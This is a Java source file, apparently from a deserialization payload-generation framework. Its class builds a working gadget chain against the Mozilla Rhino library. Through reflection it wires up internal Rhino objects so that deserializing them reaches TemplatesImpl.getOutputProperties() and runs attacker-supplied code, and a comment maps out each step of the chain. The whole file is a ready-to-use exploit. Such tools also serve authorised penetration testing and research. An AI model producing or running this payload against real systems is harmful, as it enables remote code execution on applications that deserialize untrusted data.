package com.ppp.chain.mozillarhino;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Reflections;
import org.mozilla.javascript.*;
import org.mozilla.javascript.tools.shell.Environment;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Method;
import java.util.Hashtable;
import java.util.Map;

/*

    Works on rhino 1.6R6 and above & doesn't depend on BadAttributeValueExpException's readObject

    Chain:

    NativeJavaObject.readObject()
      JavaAdapter.readAdapterObject()
        ObjectInputStream.readObject()
          ...
            NativeJavaObject.readObject()
              JavaAdapter.readAdapterObject()
                JavaAdapter.getAdapterClass()
                  JavaAdapter.getObjectFunctionNames()
                    ScriptableObject.getProperty()
                        ScriptableObject.get()
                          ScriptableObject.getImpl()
                            Method.invoke()
                              Context.enter()
        JavaAdapter.getAdapterClass()
          JavaAdapter.getObjectFunctionNames()
            ScriptableObject.getProperty()
              NativeJavaArray.get()
                NativeJavaObject.get()
                  JavaMembers.get()
                    Method.invoke()
                      TemplatesImpl.getOutputProperties()
                        ...

    by @_tint0

*/
@Dependencies({"rhino:js:1.7R2"})
@Authors({Authors.TINT0})
@Sink({Sink.TemplatesImpl})
public class MozillaRhino2 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(MozillaRhino2.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        ScriptableObject dummyScope = new Environment();
        Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);

        Object initContextMemberBox = Reflections.createWithConstructor(
                Class.forName("org.mozilla.javascript.MemberBox"),
                (Class<Object>) Class.forName("org.mozilla.javascript.MemberBox"),
                new Class[]{Method.class},
                new Object[]{Context.class.getMethod("enter")});

        ScriptableObject initContextScriptableObject = new Environment();
        Method makeSlot = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
        Reflections.setAccessible(makeSlot);
        Object slot = makeSlot.invoke(initContextScriptableObject, "x", 0, 4);
        Reflections.setFieldValue(slot, "getter", initContextMemberBox);

        NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(initContextNativeJavaObject, "parent", dummyScope);
        Reflections.setFieldValue(initContextNativeJavaObject, "isAdapter", true);
        Reflections.setFieldValue(initContextNativeJavaObject, "adapter_writeAdapterObject",
                this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        Reflections.setFieldValue(initContextNativeJavaObject, "javaObject", initContextScriptableObject);

        ScriptableObject scriptableObject = new Environment();
        scriptableObject.setParentScope(initContextNativeJavaObject);
        makeSlot.invoke(scriptableObject, "outputProperties", 0, 2);

        NativeJavaArray nativeJavaArray = Reflections.createWithoutConstructor(NativeJavaArray.class);
        Reflections.setFieldValue(nativeJavaArray, "parent", dummyScope);
        Reflections.setFieldValue(nativeJavaArray, "javaObject", templates);
        nativeJavaArray.setPrototype(scriptableObject);
        Reflections.setFieldValue(nativeJavaArray, "prototype", scriptableObject);

        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);
        Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
        Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject",
                this.getClass().getMethod("customWriteAdapterObject", Object.class, ObjectOutputStream.class));
        Reflections.setFieldValue(nativeJavaObject, "javaObject", nativeJavaArray);

        return nativeJavaObject;
    }

    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
        out.writeObject("java.lang.Object");
        out.writeObject(new String[0]);
        out.writeObject(javaObject);
    }
}
